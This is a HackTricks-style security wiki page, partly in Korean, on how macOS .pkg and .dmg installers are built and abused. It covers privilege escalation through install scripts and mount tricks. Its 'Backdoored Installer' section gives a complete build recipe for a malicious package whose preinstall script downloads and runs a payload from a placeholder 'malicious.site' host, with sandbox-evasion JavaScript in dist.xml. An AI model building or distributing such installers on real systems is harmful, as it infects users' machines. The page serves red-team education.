# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

macOS **설치 패키지**(또는 `.pkg` 파일로 알려짐)는 macOS에서 **소프트웨어를 배포하기 위해 사용되는 파일 형식**입니다. 이 파일들은 소프트웨어가 올바르게 설치되고 실행되는 데 필요한 모든 것을 포함하는 **상자**와 같습니다.

패키지 파일 자체는 **대상** 컴퓨터에 설치될 **파일 및 디렉토리의 계층 구조**를 포함하는 아카이브입니다. 또한 **설치 전후에 작업을 수행하는 스크립트**를 포함할 수 있으며, 예를 들어 구성 파일을 설정하거나 소프트웨어의 이전 버전을 정리하는 작업을 수행합니다.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)**: 사용자 정의(제목, 환영 텍스트…) 및 스크립트/설치 확인
* **PackageInfo (xml)**: 정보, 설치 요구 사항, 설치 위치, 실행할 스크립트 경로
* **Bill of materials (bom)**: 설치, 업데이트 또는 제거할 파일 목록 및 파일 권한
* **Payload (CPIO archive gzip compresses)**: PackageInfo에서 `install-location`에 설치할 파일
* **Scripts (CPIO archive gzip compressed)**: 설치 전후 스크립트 및 실행을 위해 임시 디렉토리에 추출된 추가 리소스.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG 기본 정보

DMG 파일, 또는 Apple Disk Images,는 Apple의 macOS에서 디스크 이미지를 위해 사용되는 파일 형식입니다. DMG 파일은 본질적으로 **마운트 가능한 디스크 이미지**(자체 파일 시스템을 포함함)로, 일반적으로 압축되고 때때로 암호화된 원시 블록 데이터를 포함합니다. DMG 파일을 열면 macOS가 **물리적 디스크처럼 마운트**하여 그 내용을 접근할 수 있게 합니다.

{% hint style="danger" %}
Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
{% endhint %}

### 계층 구조

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 파일의 계층 구조는 내용에 따라 다를 수 있습니다. 그러나 애플리케이션 DMG의 경우 일반적으로 다음 구조를 따릅니다:

* 최상위: 이것은 디스크 이미지의 루트입니다. 일반적으로 애플리케이션과 애플리케이션 폴더에 대한 링크를 포함합니다.
* 애플리케이션 (.app): 이것은 실제 애플리케이션입니다. macOS에서 애플리케이션은 일반적으로 애플리케이션을 구성하는 여러 개별 파일과 폴더를 포함하는 패키지입니다.
* 애플리케이션 링크: 이것은 macOS의 애플리케이션 폴더에 대한 바로 가기입니다. 이 목적은 애플리케이션 설치를 쉽게 하기 위함입니다. .app 파일을 이 바로 가기로 드래그하여 앱을 설치할 수 있습니다.

## pkg 남용을 통한 권한 상승

### 공개 디렉토리에서의 실행

예를 들어, 설치 전 또는 후 스크립트가 **`/var/tmp/Installerutil`**에서 실행되고, 공격자가 해당 스크립트를 제어할 수 있다면, 그는 실행될 때마다 권한을 상승시킬 수 있습니다. 또는 또 다른 유사한 예:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

이것은 여러 설치 프로그램과 업데이트 프로그램이 **root로 무언가를 실행하기 위해 호출하는 [공개 함수](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)**입니다. 이 함수는 **실행할 파일의 경로**를 매개변수로 받아들이지만, 공격자가 이 파일을 **수정**할 수 있다면, 그는 root로 실행을 **남용**하여 **권한을 상승**시킬 수 있습니다.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Execution by mounting

설치 프로그램이 `/tmp/fixedname/bla/bla`에 쓸 경우, **소유자가 없는** `/tmp/fixedname` 위에 **마운트를 생성**하여 설치 과정 중에 **설치 파일을 수정**하여 설치 프로세스를 악용할 수 있습니다.

이의 예로 **CVE-2021-26089**가 있으며, 이는 **주기적인 스크립트를 덮어쓰는** 방식으로 루트 권한으로 실행을 얻었습니다. 더 많은 정보는 다음 강의를 참조하세요: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

실제 페이로드 없이 **악성 코드**가 포함된 **사전 및 사후 설치 스크립트**로 **`.pkg`** 파일을 생성하는 것이 가능합니다.

### JS in Distribution xml

패키지의 **배포 xml** 파일에 **`<script>`** 태그를 추가할 수 있으며, 해당 코드는 실행되어 **`system.run`**을 사용하여 **명령을 실행**할 수 있습니다:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Backdoored Installer

dist.xml 내부에 스크립트와 JS 코드를 사용하는 악성 설치 프로그램
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

* [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
